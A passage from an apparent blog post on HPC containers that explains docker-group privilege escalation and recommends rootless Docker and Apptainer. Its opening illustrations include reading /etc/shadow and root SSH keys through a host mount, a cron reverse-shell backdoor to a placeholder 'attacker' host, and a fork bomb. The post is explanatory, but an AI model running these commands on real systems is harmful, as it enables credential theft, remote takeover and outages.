filesystem</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /:/host </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> ubuntu:latest </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Inside the container, the user can access ALL system files as root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">root@container</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># cat /host/etc/shadow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># This reveals root password hashes that should be inaccessible!</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">root@container</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># cat /host/root/.ssh/id_rsa</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Can steal other users' SSH keys</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">root@container</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: root (inside the container)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># User can write files as root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">root@container</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># echo "malicious content" &gt; /host/etc/cron.d/backdoor</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">root@container</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># echo "* * * * * root /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1'" &gt; /host/etc/cron.d/reverse_shell</span><br></span></code></pre></div></div>
<p><strong>What just happened?</strong></p>
<ul>
<li class="">A regular user (regularuser) gained root-level access</li>
<li class="">The user accessed and modified system files (e.g., <code>/etc/shadow</code>, cron jobs)</li>
<li class="">The user could install backdoors, steal credentials, and compromise the entire system</li>
<li class="">This escalation is NOT prevented by Docker—it's built into Docker's design</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Another dangerous example: Escape the resource limits</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># User runs container with no resource restrictions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">unlimited </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--cpus</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">unlimited ubuntu:latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Inside container, user runs a fork bomb</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># This crashes the entire HPC node, affecting ALL other users</span><br></span></code></pre></div></div>
<p><strong>Why is this a problem?</strong></p>
<ul>
<li class="">Docker's daemon runs as root</li>
<li class="">Any user in the docker group can communicate with the daemon</li>
<li class="">The daemon will mount/execute anything the user requests</li>
<li class="">There's no way to prevent privilege escalation once docker group access is granted</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Standard Docker setup (unsafe on shared systems)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">usermod</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-aG</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> regularuser</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Now regularuser can:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /:/host </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">.     </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Access ANY file on the system</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--privileged</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">.   </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run as root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull malicious:latest  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Download backdoored containers</span><br></span></code></pre></div></div>
<p>This is why <strong>system administrators NEVER grant docker group access on shared HPC systems</strong>.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Typical Docker setup requires sudo</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> ubuntu:latest </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Even with docker group membership, this is a privilege escalation vector</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> ubuntu:latest </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-governance-challenge">The Governance Challenge<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#the-governance-challenge" class="hash-link" aria-label="Direct link to The Governance Challenge" title="Direct link to The Governance Challenge" translate="no">​</a></h3>
<p>HPC clusters are carefully managed environments with:</p>
<ul>
<li class="">Strict security policies</li>
<li class="">Resource allocation via job schedulers (Slurm, PBS)</li>
<li class="">Multi-tenant workloads requiring isolation</li>
<li class="">Audit trails for compliance</li>
</ul>
<p>Docker's monolithic daemon architecture conflicts with these requirements. System administrators rightfully restrict Docker to prevent security breaches and resource conflicts.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="solution-1-docker-rootless-mode">Solution 1: Docker Rootless Mode<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#solution-1-docker-rootless-mode" class="hash-link" aria-label="Direct link to Solution 1: Docker Rootless Mode" title="Direct link to Solution 1: Docker Rootless Mode" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-docker-rootless">What is Docker Rootless?<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#what-is-docker-rootless" class="hash-link" aria-label="Direct link to What is Docker Rootless?" title="Direct link to What is Docker Rootless?" translate="no">​</a></h3>
<p>Docker rootless allows Docker to run without root privileges, addressing one layer of the privilege escalation problem. It uses user namespaces to isolate the daemon and containers.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-use-docker-rootless">How to Use Docker Rootless<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#how-to-use-docker-rootless" class="hash-link" aria-label="Direct link to How to Use Docker Rootless" title="Direct link to How to Use Docker Rootless" translate="no">​</a></h3>
<p><strong>Installation:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install rootless Docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> https://get.docker.com/rootless </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify installation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">dockerd-rootless-setuptool.sh </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Start the daemon</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">systemctl </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--user</span><span class="token plain"> start </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><br></span></code></pre></div></div>
<p><strong>Using rootless Docker:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># No sudo needed!</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> ubuntu:latest </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check the user</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token function" style="color:hsl(221, 87%, 60%)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: root (but it's a mapped non-root user)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="advantages">Advantages<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#advantages" class="hash-link" aria-label="Direct link to Advantages" title="Direct link to Advantages" translate="no">​</a></h3>
<ul>
<li class="">✅ No root daemon required</li>
<li class="">✅ Better isolation than standard Docker</li>
<li class="">✅ Improved security posture</li>
<li class="">✅ Familiar Docker experience for users</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="limitations-for-hpc">Limitations for HPC<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#limitations-for-hpc" class="hash-link" aria-label="Direct link to Limitations for HPC" title="Direct link to Limitations for HPC" translate="no">​</a></h3>
<ul>
<li class="">⚠️ Still uses Docker's storage and networking model</li>
<li class="">⚠️ Not optimized for cluster environments</li>
<li class="">⚠️ Doesn't integrate with HPC schedulers (Slurm)</li>
<li class="">⚠️ Limited resource control mechanisms</li>
<li class="">⚠️ Performance overhead in some scenarios</li>
</ul>
<p>Docker rootless is a step forward but doesn't solve the fundamental mismatch between Docker's design and HPC requirements.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="solution-2-singularity-now-apptainer">Solution 2: Singularity (Now Apptainer)<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#solution-2-singularity-now-apptainer" class="hash-link" aria-label="Direct link to Solution 2: Singularity (Now Apptainer)" title="Direct link to Solution 2: Singularity (Now Apptainer)" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-hpc-native-container-solution">The HPC-Native Container Solution<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#the-hpc-native-container-solution" class="hash-link" aria-label="Direct link to The HPC-Native Container Solution" title="Direct link to The HPC-Native Container Solution" translate="no">​</a></h3>
<p>Singularity was purpose-built for HPC environments. It addresses the fundamental security and scheduling problems Docker has on clusters. In 2021, it was open-sourced as <strong>Apptainer</strong> by the Linux Foundation.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-singularityapptainer-excels-on-hpc">Why Singularity/Apptainer Excels on HPC<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#why-singularityapptainer-excels-on-hpc" class="hash-link" aria-label="Direct link to Why Singularity/Apptainer Excels on HPC" title="Direct link to Why Singularity/Apptainer Excels on HPC" translate="no">​</a></h3>
<p><strong>User-focused design:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run as normal user, no daemon required</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity run mycontainer.sif</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Direct execution without privilege escalation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> mycontainer.sif python script.py</span><br></span></code></pre></div></div>
<p><strong>Container is a single file:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Portable and easy to manage</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lh</span><span class="token plain"> mycontainer.sif</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: -rw-r--r--  1 user group 2.5G Feb 11 10:00 mycontainer.sif</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy between systems</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> mycontainer.sif /cluster/home/user/</span><br></span></code></pre></div></div>
<p><strong>Preserves user identity and permissions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Inside container, you're still yourself</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> mycontainer.sif </span><span class="token function" style="color:hsl(221, 87%, 60%)">id</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: uid=1001(user) gid=1002(group)...</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Access your files as expected</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> mycontainer.sif </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-la</span><span class="token plain"> ~</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="installing-singularityapptainer-with-pixi-recommended">Installing Singularity/Apptainer with Pixi (Recommended)<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#installing-singularityapptainer-with-pixi-recommended" class="hash-link" aria-label="Direct link to Installing Singularity/Apptainer with Pixi (Recommended)" title="Direct link to Installing Singularity/Apptainer with Pixi (Recommended)" translate="no">​</a></h3>
<p>Since Singularity/Apptainer are commonly used across HPC systems and bioinformatics workflows, the modern approach is to install them globally using <strong>Pixi</strong>, which is much simpler and more reliable than traditional package managers.</p>
<p><strong>Step 1: Install Pixi (if not already installed):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># One-time setup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-fsSL</span><span class="token plain"> https://pixi.sh/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add pixi to your PATH to use in current shell, or open new shell to reload</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable environment constant" style="color:hsl(35, 99%, 36%)">PATH</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$HOME</span><span class="token string" style="color:hsl(119, 34%, 47%)">/.pixi/bin:</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PATH</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify pixi installation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p><strong>Step 2: Install Apptainer globally:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Simple one-liner - that's it!</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> apptainer</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify installation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p><strong>Step 3 (Optional): Install other common bioinformatics tools globally:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install multiple tools at once</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> apptainer </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> conda-forge </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--expose</span><span class="token plain"> apptainer</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># All tools are now available system-wide</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p><strong>Benefits of this approach:</strong></p>
<ul>
<li class="">✅ <strong>Simple</strong>: Just <code>pixi global install apptainer</code></li>
<li class="">✅ <strong>No sudo required</strong>: Installs in user space</li>
<li class="">✅ <strong>Works everywhere</strong>: Linux, macOS, HPC clusters</li>
<li class="">✅ <strong>Modern dependencies</strong>: Always gets recent versions from conda-forge</li>
<li class="">✅ <strong>Reproducible</strong>: Lock files track exact versions if needed</li>
<li class="">✅ <strong>Easy updates</strong>: <code>pixi global upgrade apptainer</code></li>
</ul>
<p><strong>Verify the Installation:</strong></p>
